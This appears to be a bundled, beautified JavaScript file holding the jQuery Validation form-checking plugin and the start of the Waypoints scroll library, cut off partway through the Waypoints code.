function hexToRgb(t) {
    t = t.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i,
    function(t, e, i, n) {
        return e + e + i + i + n + n
    });
    var e = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t);
    return e ? {
        r: parseInt(e[1], 16),
        g: parseInt(e[2], 16),
        b: parseInt(e[3], 16)
    }: null
}
function clamp(t, e, i) {
    return Math.min(Math.max(t, e), i)
}
function isInArray(t, e) {
    return e.indexOf(t) > -1
} !
function(t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof module && module.exports ? module.exports = t(require("jquery")) : t(jQuery)
} (function(t) {
    t.extend(t.fn, {
        validate: function(e) {
            if (!this.length) return void(e && e.debug && window.console && console.warn("Nothing selected, can't validate, returning nothing."));
            var i = t.data(this[0], "validator");
            return i ? i: (this.attr("novalidate", "novalidate"), i = new t.validator(e, this[0]), t.data(this[0], "validator", i), i.settings.onsubmit && (this.on("click.validate", ":submit",
            function(e) {
                i.settings.submitHandler && (i.submitButton = e.target),
                t(this).hasClass("cancel") && (i.cancelSubmit = !0),
                void 0 !== t(this).attr("formnovalidate") && (i.cancelSubmit = !0)
            }), this.on("submit.validate",
            function(e) {
                function n() {
                    var n, r;
                    return ! i.settings.submitHandler || (i.submitButton && (n = t("<input type='hidden'/>").attr("name", i.submitButton.name).val(t(i.submitButton).val()).appendTo(i.currentForm)), r = i.settings.submitHandler.call(i, i.currentForm, e), i.submitButton && n.remove(), void 0 !== r && r)
                }
                return i.settings.debug && e.preventDefault(),
                i.cancelSubmit ? (i.cancelSubmit = !1, n()) : i.form() ? i.pendingRequest ? (i.formSubmitted = !0, !1) : n() : (i.focusInvalid(), !1)
            })), i)
        },
        valid: function() {
            var e, i, n;
            return t(this[0]).is("form") ? e = this.validate().form() : (n = [], e = !0, i = t(this[0].form).validate(), this.each(function() { (e = i.element(this) && e) || (n = n.concat(i.errorList))
            }), i.errorList = n),
            e
        },
        rules: function(e, i) {
            var n, r, s, a, o, l, c = this[0];
            if (null != c && null != c.form) {
                if (e) switch (n = t.data(c.form, "validator").settings, r = n.rules, s = t.validator.staticRules(c), e) {
                case "add":
                    t.extend(s, t.validator.normalizeRule(i)),
                    delete s.messages,
                    r[c.name] = s,
                    i.messages && (n.messages[c.name] = t.extend(n.messages[c.name], i.messages));
                    break;
                case "remove":
                    return i ? (l = {},
                    t.each(i.split(/\s/),
                    function(e, i) {
                        l[i] = s[i],
                        delete s[i],
                        "required" === i && t(c).removeAttr("aria-required")
                    }), l) : (delete r[c.name], s)
                }
                return a = t.validator.normalizeRules(t.extend({},
                t.validator.classRules(c), t.validator.attributeRules(c), t.validator.dataRules(c), t.validator.staticRules(c)), c),
                a.required && (o = a.required, delete a.required, a = t.extend({
                    required: o
                },
                a), t(c).attr("aria-required", "true")),
                a.remote && (o = a.remote, delete a.remote, a = t.extend(a, {
                    remote: o
                })),
                a
            }
        }
    }),
    t.extend(t.expr.pseudos || t.expr[":"], {
        blank: function(e) {
            return ! t.trim("" + t(e).val())
        },
        filled: function(e) {
            var i = t(e).val();
            return null !== i && !!t.trim("" + i)
        },
        unchecked: function(e) {
            return ! t(e).prop("checked")
        }
    }),
    t.validator = function(e, i) {
        this.settings = t.extend(!0, {},
        t.validator.defaults, e),
        this.currentForm = i,
        this.init()
    },
    t.validator.format = function(e, i) {
        return 1 === arguments.length ?
        function() {
            var i = t.makeArray(arguments);
            return i.unshift(e),
            t.validator.format.apply(this, i)
        }: void 0 === i ? e: (arguments.length > 2 && i.constructor !== Array && (i = t.makeArray(arguments).slice(1)), i.constructor !== Array && (i = [i]), t.each(i,
        function(t, i) {
            e = e.replace(new RegExp("\\{" + t + "\\}", "g"),
            function() {
                return i
            })
        }), e)
    },
    t.extend(t.validator, {
        defaults: {
            messages: {},
            groups: {},
            rules: {},
            errorClass: "error",
            pendingClass: "pending",
            validClass: "valid",
            errorElement: "label",
            focusCleanup: !1,
            focusInvalid: !0,
            errorContainer: t([]),
            errorLabelContainer: t([]),
            onsubmit: !0,
            ignore: ":hidden",
            ignoreTitle: !1,
            onfocusin: function(t) {
                this.lastActive = t,
                this.settings.focusCleanup && (this.settings.unhighlight && this.settings.unhighlight.call(this, t, this.settings.errorClass, this.settings.validClass), this.hideThese(this.errorsFor(t)))
            },
            onfocusout: function(t) {
                this.checkable(t) || !(t.name in this.submitted) && this.optional(t) || this.element(t)
            },
            onkeyup: function(e, i) {
                var n = [16, 17, 18, 20, 35, 36, 37, 38, 39, 40, 45, 144, 225];
                9 === i.which && "" === this.elementValue(e) || t.inArray(i.keyCode, n) !== -1 || (e.name in this.submitted || e.name in this.invalid) && this.element(e)
            },
            onclick: function(t) {
                t.name in this.submitted ? this.element(t) : t.parentNode.name in this.submitted && this.element(t.parentNode)
            },
            highlight: function(e, i, n) {
                "radio" === e.type ? this.findByName(e.name).addClass(i).removeClass(n) : t(e).addClass(i).removeClass(n)
            },
            unhighlight: function(e, i, n) {
                "radio" === e.type ? this.findByName(e.name).removeClass(i).addClass(n) : t(e).removeClass(i).addClass(n)
            }
        },
        setDefaults: function(e) {
            t.extend(t.validator.defaults, e)
        },
        messages: {
            required: "This field is required.",
            remote: "Please fix this field.",
            email: "Please enter a valid email address.",
            url: "Please enter a valid URL.",
            date: "Please enter a valid date.",
            dateISO: "Please enter a valid date (ISO).",
            number: "Please enter a valid number.",
            digits: "Please enter only digits.",
            equalTo: "Please enter the same value again.",
            maxlength: t.validator.format("Please enter no more than {0} characters."),
            minlength: t.validator.format("Please enter at least {0} characters."),
            rangelength: t.validator.format("Please enter a value between {0} and {1} characters long."),
            range: t.validator.format("Please enter a value between {0} and {1}."),
            max: t.validator.format("Please enter a value less than or equal to {0}."),
            min: t.validator.format("Please enter a value greater than or equal to {0}."),
            step: t.validator.format("Please enter a multiple of {0}.")
        },
        autoCreateRanges: !1,
        prototype: {
            init: function() {
                function e(e) { ! this.form && this.hasAttribute("contenteditable") && (this.form = t(this).closest("form")[0]);
                    var i = t.data(this.form, "validator"),
                    n = "on" + e.type.replace(/^validate/, ""),
                    r = i.settings;
                    r[n] && !t(this).is(r.ignore) && r[n].call(i, this, e)
                }
                this.labelContainer = t(this.settings.errorLabelContainer),
                this.errorContext = this.labelContainer.length && this.labelContainer || t(this.currentForm),
                this.containers = t(this.settings.errorContainer).add(this.settings.errorLabelContainer),
                this.submitted = {},
                this.valueCache = {},
                this.pendingRequest = 0,
                this.pending = {},
                this.invalid = {},
                this.reset();
                var i, n = this.groups = {};
                t.each(this.settings.groups,
                function(e, i) {
                    "string" == typeof i && (i = i.split(/\s/)),
                    t.each(i,
                    function(t, i) {
                        n[i] = e
                    })
                }),
                i = this.settings.rules,
                t.each(i,
                function(e, n) {
                    i[e] = t.validator.normalizeRule(n)
                }),
                t(this.currentForm).on("focusin.validate focusout.validate keyup.validate", ":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], [type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox'], [contenteditable], [type='button']", e).on("click.validate", "select, option, [type='radio'], [type='checkbox']", e),
                this.settings.invalidHandler && t(this.currentForm).on("invalid-form.validate", this.settings.invalidHandler),
                t(this.currentForm).find("[required], [data-rule-required], .required").attr("aria-required", "true")
            },
            form: function() {
                return this.checkForm(),
                t.extend(this.submitted, this.errorMap),
                this.invalid = t.extend({},
                this.errorMap),
                this.valid() || t(this.currentForm).triggerHandler("invalid-form", [this]),
                this.showErrors(),
                this.valid()
            },
            checkForm: function() {
                this.prepareForm();
                for (var t = 0,
                e = this.currentElements = this.elements(); e[t]; t++) this.check(e[t]);
                return this.valid()
            },
            element: function(e) {
                var i, n, r = this.clean(e),
                s = this.validationTargetFor(r),
                a = this,
                o = !0;
                return void 0 === s ? delete this.invalid[r.name] : (this.prepareElement(s), this.currentElements = t(s), n = this.groups[s.name], n && t.each(this.groups,
                function(t, e) {
                    e === n && t !== s.name && (r = a.validationTargetFor(a.clean(a.findByName(t)))) && r.name in a.invalid && (a.currentElements.push(r), o = a.check(r) && o)
                }), i = this.check(s) !== !1, o = o && i, this.invalid[s.name] = !i, this.numberOfInvalids() || (this.toHide = this.toHide.add(this.containers)), this.showErrors(), t(e).attr("aria-invalid", !i)),
                o
            },
            showErrors: function(e) {
                if (e) {
                    var i = this;
                    t.extend(this.errorMap, e),
                    this.errorList = t.map(this.errorMap,
                    function(t, e) {
                        return {
                            message: t,
                            element: i.findByName(e)[0]
                        }
                    }),
                    this.successList = t.grep(this.successList,
                    function(t) {
                        return ! (t.name in e)
                    })
                }
                this.settings.showErrors ? this.settings.showErrors.call(this, this.errorMap, this.errorList) : this.defaultShowErrors()
            },
            resetForm: function() {
                t.fn.resetForm && t(this.currentForm).resetForm(),
                this.invalid = {},
                this.submitted = {},
                this.prepareForm(),
                this.hideErrors();
                var e = this.elements().removeData("previousValue").removeAttr("aria-invalid");
                this.resetElements(e)
            },
            resetElements: function(t) {
                var e;
                if (this.settings.unhighlight) for (e = 0; t[e]; e++) this.settings.unhighlight.call(this, t[e], this.settings.errorClass, ""),
                this.findByName(t[e].name).removeClass(this.settings.validClass);
                else t.removeClass(this.settings.errorClass).removeClass(this.settings.validClass)
            },
            numberOfInvalids: function() {
                return this.objectLength(this.invalid)
            },
            objectLength: function(t) {
                var e, i = 0;
                for (e in t) t[e] && i++;
                return i
            },
            hideErrors: function() {
                this.hideThese(this.toHide)
            },
            hideThese: function(t) {
                t.not(this.containers).text(""),
                this.addWrapper(t).hide()
            },
            valid: function() {
                return 0 === this.size()
            },
            size: function() {
                return this.errorList.length
            },
            focusInvalid: function() {
                if (this.settings.focusInvalid) try {
                    t(this.findLastActive() || this.errorList.length && this.errorList[0].element || []).filter(":visible").focus().trigger("focusin")
                } catch(t) {}
            },
            findLastActive: function() {
                var e = this.lastActive;
                return e && 1 === t.grep(this.errorList,
                function(t) {
                    return t.element.name === e.name
                }).length && e
            },
            elements: function() {
                var e = this,
                i = {};
                return t(this.currentForm).find("input, select, textarea, [contenteditable]").not(":submit, :reset, :image, :disabled").not(this.settings.ignore).filter(function() {
                    var n = this.name || t(this).attr("name");
                    return ! n && e.settings.debug && window.console && console.error("%o has no name assigned", this),
                    this.hasAttribute("contenteditable") && (this.form = t(this).closest("form")[0]),
                    !(n in i || !e.objectLength(t(this).rules())) && (i[n] = !0, !0)
                })
            },
            clean: function(e) {
                return t(e)[0]
            },
            errors: function() {
                var e = this.settings.errorClass.split(" ").join(".");
                return t(this.settings.errorElement + "." + e, this.errorContext)
            },
            resetInternals: function() {
                this.successList = [],
                this.errorList = [],
                this.errorMap = {},
                this.toShow = t([]),
                this.toHide = t([])
            },
            reset: function() {
                this.resetInternals(),
                this.currentElements = t([])
            },
            prepareForm: function() {
                this.reset(),
                this.toHide = this.errors().add(this.containers)
            },
            prepareElement: function(t) {
                this.reset(),
                this.toHide = this.errorsFor(t)
            },
            elementValue: function(e) {
                var i, n, r = t(e),
                s = e.type;
                return "radio" === s || "checkbox" === s ? this.findByName(e.name).filter(":checked").val() : "number" === s && void 0 !== e.validity ? e.validity.badInput ? "NaN": r.val() : (i = e.hasAttribute("contenteditable") ? r.text() : r.val(), "file" === s ? "C:\\fakepath\\" === i.substr(0, 12) ? i.substr(12) : (n = i.lastIndexOf("/")) >= 0 ? i.substr(n + 1) : (n = i.lastIndexOf("\\"), n >= 0 ? i.substr(n + 1) : i) : "string" == typeof i ? i.replace(/\r/g, "") : i)
            },
            check: function(e) {
                e = this.validationTargetFor(this.clean(e));
                var i, n, r, s = t(e).rules(),
                a = t.map(s,
                function(t, e) {
                    return e
                }).length,
                o = !1,
                l = this.elementValue(e);
                if ("function" == typeof s.normalizer) {
                    if ("string" != typeof(l = s.normalizer.call(e, l))) throw new TypeError("The normalizer should return a string value.");
                    delete s.normalizer
                }
                for (n in s) {
                    r = {
                        method: n,
                        parameters: s[n]
                    };
                    try {
                        if ("dependency-mismatch" === (i = t.validator.methods[n].call(this, l, e, r.parameters)) && 1 === a) {
                            o = !0;
                            continue
                        }
                        if (o = !1, "pending" === i) return void(this.toHide = this.toHide.not(this.errorsFor(e)));
                        if (!i) return this.formatAndAdd(e, r),
                        !1
                    } catch(t) {
                        throw this.settings.debug && window.console && console.log("Exception occurred when checking element " + e.id + ", check the '" + r.method + "' method.", t),
                        t instanceof TypeError && (t.message += ".  Exception occurred when checking element " + e.id + ", check the '" + r.method + "' method."),
                        t
                    }
                }
                if (!o) return this.objectLength(s) && this.successList.push(e),
                !0
            },
            customDataMessage: function(e, i) {
                return t(e).data("msg" + i.charAt(0).toUpperCase() + i.substring(1).toLowerCase()) || t(e).data("msg")
            },
            customMessage: function(t, e) {
                var i = this.settings.messages[t];
                return i && (i.constructor === String ? i: i[e])
            },
            findDefined: function() {
                for (var t = 0; t < arguments.length; t++) if (void 0 !== arguments[t]) return arguments[t]
            },
            defaultMessage: function(e, i) {
                "string" == typeof i && (i = {
                    method: i
                });
                var n = this.findDefined(this.customMessage(e.name, i.method), this.customDataMessage(e, i.method), !this.settings.ignoreTitle && e.title || void 0, t.validator.messages[i.method], "<strong>Warning: No message defined for " + e.name + "</strong>"),
                r = /\$?\{(\d+)\}/g;
                return "function" == typeof n ? n = n.call(this, i.parameters, e) : r.test(n) && (n = t.validator.format(n.replace(r, "{$1}"), i.parameters)),
                n
            },
            formatAndAdd: function(t, e) {
                var i = this.defaultMessage(t, e);
                this.errorList.push({
                    message: i,
                    element: t,
                    method: e.method
                }),
                this.errorMap[t.name] = i,
                this.submitted[t.name] = i
            },
            addWrapper: function(t) {
                return this.settings.wrapper && (t = t.add(t.parent(this.settings.wrapper))),
                t
            },
            defaultShowErrors: function() {
                var t, e, i;
                for (t = 0; this.errorList[t]; t++) i = this.errorList[t],
                this.settings.highlight && this.settings.highlight.call(this, i.element, this.settings.errorClass, this.settings.validClass),
                this.showLabel(i.element, i.message);
                if (this.errorList.length && (this.toShow = this.toShow.add(this.containers)), this.settings.success) for (t = 0; this.successList[t]; t++) this.showLabel(this.successList[t]);
                if (this.settings.unhighlight) for (t = 0, e = this.validElements(); e[t]; t++) this.settings.unhighlight.call(this, e[t], this.settings.errorClass, this.settings.validClass);
                this.toHide = this.toHide.not(this.toShow),
                this.hideErrors(),
                this.addWrapper(this.toShow).show()
            },
            validElements: function() {
                return this.currentElements.not(this.invalidElements())
            },
            invalidElements: function() {
                return t(this.errorList).map(function() {
                    return this.element
                })
            },
            showLabel: function(e, i) {
                var n, r, s, a, o = this.errorsFor(e),
                l = this.idOrName(e),
                c = t(e).attr("aria-describedby");
                o.length ? (o.removeClass(this.settings.validClass).addClass(this.settings.errorClass), o.html(i)) : (o = t("<" + this.settings.errorElement + ">").attr("id", l + "-error").addClass(this.settings.errorClass).html(i || ""), n = o, this.settings.wrapper && (n = o.hide().show().wrap("<" + this.settings.wrapper + "/>").parent()), this.labelContainer.length ? this.labelContainer.append(n) : this.settings.errorPlacement ? this.settings.errorPlacement.call(this, n, t(e)) : n.insertAfter(e), o.is("label") ? o.attr("for", l) : 0 === o.parents("label[for='" + this.escapeCssMeta(l) + "']").length && (s = o.attr("id"), c ? c.match(new RegExp("\\b" + this.escapeCssMeta(s) + "\\b")) || (c += " " + s) : c = s, t(e).attr("aria-describedby", c), (r = this.groups[e.name]) && (a = this, t.each(a.groups,
                function(e, i) {
                    i === r && t("[name='" + a.escapeCssMeta(e) + "']", a.currentForm).attr("aria-describedby", o.attr("id"))
                })))),
                !i && this.settings.success && (o.text(""), "string" == typeof this.settings.success ? o.addClass(this.settings.success) : this.settings.success(o, e)),
                this.toShow = this.toShow.add(o)
            },
            errorsFor: function(e) {
                var i = this.escapeCssMeta(this.idOrName(e)),
                n = t(e).attr("aria-describedby"),
                r = "label[for='" + i + "'], label[for='" + i + "'] *";
                return n && (r = r + ", #" + this.escapeCssMeta(n).replace(/\s+/g, ", #")),
                this.errors().filter(r)
            },
            escapeCssMeta: function(t) {
                return t.replace(/([\\!"#$%&'()*+,.\/:;<=>?@\[\]^`{|}~])/g, "\\$1")
            },
            idOrName: function(t) {
                return this.groups[t.name] || (this.checkable(t) ? t.name: t.id || t.name)
            },
            validationTargetFor: function(e) {
                return this.checkable(e) && (e = this.findByName(e.name)),
                t(e).not(this.settings.ignore)[0]
            },
            checkable: function(t) {
                return /radio|checkbox/i.test(t.type)
            },
            findByName: function(e) {
                return t(this.currentForm).find("[name='" + this.escapeCssMeta(e) + "']")
            },
            getLength: function(e, i) {
                switch (i.nodeName.toLowerCase()) {
                case "select":
                    return t("option:selected", i).length;
                case "input":
                    if (this.checkable(i)) return this.findByName(i.name).filter(":checked").length
                }
                return e.length
            },
            depend: function(t, e) {
                return ! this.dependTypes[typeof t] || this.dependTypes[typeof t](t, e)
            },
            dependTypes: {
                boolean: function(t) {
                    return t
                },
                string: function(e, i) {
                    return !! t(e, i.form).length
                },
                function: function(t, e) {
                    return t(e)
                }
            },
            optional: function(e) {
                var i = this.elementValue(e);
                return ! t.validator.methods.required.call(this, i, e) && "dependency-mismatch"
            },
            startRequest: function(e) {
                this.pending[e.name] || (this.pendingRequest++, t(e).addClass(this.settings.pendingClass), this.pending[e.name] = !0)
            },
            stopRequest: function(e, i) {
                this.pendingRequest--,
                this.pendingRequest < 0 && (this.pendingRequest = 0),
                delete this.pending[e.name],
                t(e).removeClass(this.settings.pendingClass),
                i && 0 === this.pendingRequest && this.formSubmitted && this.form() ? (t(this.currentForm).submit(), this.formSubmitted = !1) : !i && 0 === this.pendingRequest && this.formSubmitted && (t(this.currentForm).triggerHandler("invalid-form", [this]), this.formSubmitted = !1)
            },
            previousValue: function(e, i) {
                return i = "string" == typeof i && i || "remote",
                t.data(e, "previousValue") || t.data(e, "previousValue", {
                    old: null,
                    valid: !0,
                    message: this.defaultMessage(e, {
                        method: i
                    })
                })
            },
            destroy: function() {
                this.resetForm(),
                t(this.currentForm).off(".validate").removeData("validator").find(".validate-equalTo-blur").off(".validate-equalTo").removeClass("validate-equalTo-blur")
            }
        },
        classRuleSettings: {
            required: {
                required: !0
            },
            email: {
                email: !0
            },
            url: {
                url: !0
            },
            date: {
                date: !0
            },
            dateISO: {
                dateISO: !0
            },
            number: {
                number: !0
            },
            digits: {
                digits: !0
            },
            creditcard: {
                creditcard: !0
            }
        },
        addClassRules: function(e, i) {
            e.constructor === String ? this.classRuleSettings[e] = i: t.extend(this.classRuleSettings, e)
        },
        classRules: function(e) {
            var i = {},
            n = t(e).attr("class");
            return n && t.each(n.split(" "),
            function() {
                this in t.validator.classRuleSettings && t.extend(i, t.validator.classRuleSettings[this])
            }),
            i
        },
        normalizeAttributeRule: function(t, e, i, n) { / min | max | step / .test(i) && (null === e || /number|range|text/.test(e)) && (n = Number(n), isNaN(n) && (n = void 0)),
            n || 0 === n ? t[i] = n: e === i && "range" !== e && (t[i] = !0)
        },
        attributeRules: function(e) {
            var i, n, r = {},
            s = t(e),
            a = e.getAttribute("type");
            for (i in t.validator.methods)"required" === i ? (n = e.getAttribute(i), "" === n && (n = !0), n = !!n) : n = s.attr(i),
            this.normalizeAttributeRule(r, a, i, n);
            return r.maxlength && /-1|2147483647|524288/.test(r.maxlength) && delete r.maxlength,
            r
        },
        dataRules: function(e) {
            var i, n, r = {},
            s = t(e),
            a = e.getAttribute("type");
            for (i in t.validator.methods) n = s.data("rule" + i.charAt(0).toUpperCase() + i.substring(1).toLowerCase()),
            this.normalizeAttributeRule(r, a, i, n);
            return r
        },
        staticRules: function(e) {
            var i = {},
            n = t.data(e.form, "validator");
            return n.settings.rules && (i = t.validator.normalizeRule(n.settings.rules[e.name]) || {}),
            i
        },
        normalizeRules: function(e, i) {
            return t.each(e,
            function(n, r) {
                if (r === !1) return void delete e[n];
                if (r.param || r.depends) {
                    var s = !0;
                    switch (typeof r.depends) {
                    case "string":
                        s = !!t(r.depends, i.form).length;
                        break;
                    case "function":
                        s = r.depends.call(i, i)
                    }
                    s ? e[n] = void 0 === r.param || r.param: (t.data(i.form, "validator").resetElements(t(i)), delete e[n])
                }
            }),
            t.each(e,
            function(n, r) {
                e[n] = t.isFunction(r) && "normalizer" !== n ? r(i) : r
            }),
            t.each(["minlength", "maxlength"],
            function() {
                e[this] && (e[this] = Number(e[this]))
            }),
            t.each(["rangelength", "range"],
            function() {
                var i;
                e[this] && (t.isArray(e[this]) ? e[this] = [Number(e[this][0]), Number(e[this][1])] : "string" == typeof e[this] && (i = e[this].replace(/[\[\]]/g, "").split(/[\s,]+/), e[this] = [Number(i[0]), Number(i[1])]))
            }),
            t.validator.autoCreateRanges && (null != e.min && null != e.max && (e.range = [e.min, e.max], delete e.min, delete e.max), null != e.minlength && null != e.maxlength && (e.rangelength = [e.minlength, e.maxlength], delete e.minlength, delete e.maxlength)),
            e
        },
        normalizeRule: function(e) {
            if ("string" == typeof e) {
                var i = {};
                t.each(e.split(/\s/),
                function() {
                    i[this] = !0
                }),
                e = i
            }
            return e
        },
        addMethod: function(e, i, n) {
            t.validator.methods[e] = i,
            t.validator.messages[e] = void 0 !== n ? n: t.validator.messages[e],
            i.length < 3 && t.validator.addClassRules(e, t.validator.normalizeRule(e))
        },
        methods: {
            required: function(e, i, n) {
                if (!this.depend(n, i)) return "dependency-mismatch";
                if ("select" === i.nodeName.toLowerCase()) {
                    var r = t(i).val();
                    return r && r.length > 0
                }
                return this.checkable(i) ? this.getLength(e, i) > 0 : e.length > 0
            },
            email: function(t, e) {
                return this.optional(e) || /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(t)
            },
            url: function(t, e) {
                return this.optional(e) || /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[\/?#]\S*)?$/i.test(t)
            },
            date: function(t, e) {
                return this.optional(e) || !/Invalid|NaN/.test(new Date(t).toString())
            },
            dateISO: function(t, e) {
                return this.optional(e) || /^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(t)
            },
            number: function(t, e) {
                return this.optional(e) || /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(t)
            },
            digits: function(t, e) {
                return this.optional(e) || /^\d+$/.test(t)
            },
            minlength: function(e, i, n) {
                var r = t.isArray(e) ? e.length: this.getLength(e, i);
                return this.optional(i) || r >= n
            },
            maxlength: function(e, i, n) {
                var r = t.isArray(e) ? e.length: this.getLength(e, i);
                return this.optional(i) || r <= n
            },
            rangelength: function(e, i, n) {
                var r = t.isArray(e) ? e.length: this.getLength(e, i);
                return this.optional(i) || r >= n[0] && r <= n[1]
            },
            min: function(t, e, i) {
                return this.optional(e) || t >= i
            },
            max: function(t, e, i) {
                return this.optional(e) || t <= i
            },
            range: function(t, e, i) {
                return this.optional(e) || t >= i[0] && t <= i[1]
            },
            step: function(e, i, n) {
                var r, s = t(i).attr("type"),
                a = "Step attribute on input type " + s + " is not supported.",
                o = ["text", "number", "range"],
                l = new RegExp("\\b" + s + "\\b"),
                c = s && !l.test(o.join()),
                h = function(t) {
                    var e = ("" + t).match(/(?:\.(\d+))?$/);
                    return e && e[1] ? e[1].length: 0
                },
                u = function(t) {
                    return Math.round(t * Math.pow(10, r))
                },
                d = !0;
                if (c) throw new Error(a);
                return r = h(n),
                (h(e) > r || u(e) % u(n) != 0) && (d = !1),
                this.optional(i) || d
            },
            equalTo: function(e, i, n) {
                var r = t(n);
                return this.settings.onfocusout && r.not(".validate-equalTo-blur").length && r.addClass("validate-equalTo-blur").on("blur.validate-equalTo",
                function() {
                    t(i).valid()
                }),
                e === r.val()
            },
            remote: function(e, i, n, r) {
                if (this.optional(i)) return "dependency-mismatch";
                r = "string" == typeof r && r || "remote";
                var s, a, o, l = this.previousValue(i, r);
                return this.settings.messages[i.name] || (this.settings.messages[i.name] = {}),
                l.originalMessage = l.originalMessage || this.settings.messages[i.name][r],
                this.settings.messages[i.name][r] = l.message,
                n = "string" == typeof n && {
                    url: n
                } || n,
                o = t.param(t.extend({
                    data: e
                },
                n.data)),
                l.old === o ? l.valid: (l.old = o, s = this, this.startRequest(i), a = {},
                a[i.name] = e, t.ajax(t.extend(!0, {
                    mode: "abort",
                    port: "validate" + i.name,
                    dataType: "json",
                    data: a,
                    context: s.currentForm,
                    success: function(t) {
                        var n, a, o, c = t === !0 || "true" === t;
                        s.settings.messages[i.name][r] = l.originalMessage,
                        c ? (o = s.formSubmitted, s.resetInternals(), s.toHide = s.errorsFor(i), s.formSubmitted = o, s.successList.push(i), s.invalid[i.name] = !1, s.showErrors()) : (n = {},
                        a = t || s.defaultMessage(i, {
                            method: r,
                            parameters: e
                        }), n[i.name] = l.message = a, s.invalid[i.name] = !0, s.showErrors(n)),
                        l.valid = c,
                        s.stopRequest(i, c)
                    }
                },
                n)), "pending")
            }
        }
    });
    var e, i = {};
    return t.ajaxPrefilter ? t.ajaxPrefilter(function(t, e, n) {
        var r = t.port;
        "abort" === t.mode && (i[r] && i[r].abort(), i[r] = n)
    }) : (e = t.ajax, t.ajax = function(n) {
        var r = ("mode" in n ? n: t.ajaxSettings).mode,
        s = ("port" in n ? n: t.ajaxSettings).port;
        return "abort" === r ? (i[s] && i[s].abort(), i[s] = e.apply(this, arguments), i[s]) : e.apply(this, arguments)
    }),
    t
}),
function() {
    "use strict";
    function t(n) {
        if (!n) throw new Error("No options passed to Waypoint constructor");
        if (!n.element) throw new Error("No element option passed to Waypoint constructor");
        if (!n.handler) throw new Error("No handler option passed to Waypoint constructor");
        this.key = "waypoint-" + e,
        this.options = t.Adapter.extend({},
        t.defaults, n),
        this.element = this.options.element,
        this.adapter = new t.Adapter(this.element),
        this.callback = n.handler,
        this.axis = this.options.horizontal ? "horizontal": "vertical",
        this.enabled = this.options.enabled,
        this.triggerPoint = null,
        this.group = t.Group.findOrCreate({
            name: this.options.group,
            axis: this.axis
        }),
        this.context = t.Context.findOrCreateByElement(this.options.context),
        t.offsetAliases[this.options.offset] && (this.options.offset = t.offsetAliases[this.options.offset]),
        this.group.add(this),
        this.context.add(this),
        i[this.key] = this,
        e += 1
    }
    var e = 0,
    i = {};
    t.prototype.queueTrigger = function(t) {
        this.group.queueTrigger(this, t)
    },
    t.prototype.trigger = function(t) {
        this.enabled && this.callback && this.callback.apply(this, t)
    },
    t.prototype.destroy = function() {
        this.context.remove(this),
        this.group.remove(this),
        delete i[this.key]
    },
    t.prototype.disable = function() {
        return this.enabled = !1,
        this
    },
    t.prototype.enable = function() {
        return this.context.refresh(),
        this.enabled = !0,
        this
    },
    t.prototype.next = function() {
        return this.group.next(this)
    },
    t.prototype.previous = function() {
        return this.group.previous(this)
    },
    t.invokeAll = function(t) {
        var e = [];
        for (var n in i) e.push(i[n]);
        for (var r = 0,
        s = e.length; r < s; r++) e[r][t]()
    },
    t.destroyAll = function() {
        t.invokeAll("destroy")
    },
    t.disableAll = function() {
        t.invokeAll("disable")
    },
    t.enableAll = function() {
        t.invokeAll("enable")
    },
    t.refreshAll = function() {
        t.Context.refreshAll()
    },
    t.viewportHeight = function() {
        return window.innerHeight || document.documentElement.clientHeight
    },
    t.viewportWidth = function() {
        return document.documentElement.clientWidth
    },
    t.adapters = [],
    t.defaults = {
        context: window,
        continuous: !0,
        enabled: !0,
        group: "default",
        horizontal: !1,
        offset: 0
    },
    t.offsetAliases = {
        "bottom-in-view": function() {
            return this.context.innerHeight() - this.adapter.outerHeight()
        },
        "right-in-view": function() {
            return this.context.innerWidth() - this.adapter.outerWidth()
        }
    },
    window.Waypoint = t
} (),
function() {
    "use strict";
    function t(t) {
        window.setTimeout(t, 1e3 / 60)
    }
    function e(t) {
        this.element = t,
        this.Adapter = r.Adapter,
        this.adapter = new this.Adapter(t),
        this.key = "waypoint-context-" + i,
        this.didScroll = !1,
        this.didResize = !1,
        this.oldScroll = {
            x: this.adapter.scrollLeft(),
            y: this.adapter.scrollTop()
        },
        this.waypoints = {
            vertical: {},
            horizontal: {}
        },
        t.waypointContextKey = this.key,
        n[t.waypointContextKey] = this,
        i += 1,
        this.createThrottledScrollHandler(),
        this.createThrottledResizeHandler()
    }
    var i = 0,
    n = {},
    r = window.Waypoint,
    s = window.onload;
    e.prototype.add = function(t) {
        var e = t.options.horizontal ? "horizontal": "vertical";
        this.waypoints[e][t.key] = t,
        this.refresh()
    },
    e.prototype.checkEmpty = function() {
        var t = this.Adapter.isEmptyObject(this.waypoints.horizontal),
        e = this.Adapter.isEmptyObject(this.waypoints.vertical);
        t && e && (this.adapter.off(".waypoints"), delete n[this.key])
    },
    e.prototype.createThrottledResizeHandler = function() {
        function t() {
            e.handleResize(),
            e.didResize = !1
        }
        var e = this;
        this.adapter.on("resize.waypoints",
        function() {
            e.didResize || (e.didResize = !0, r.requestAnimationFrame(t))
        })
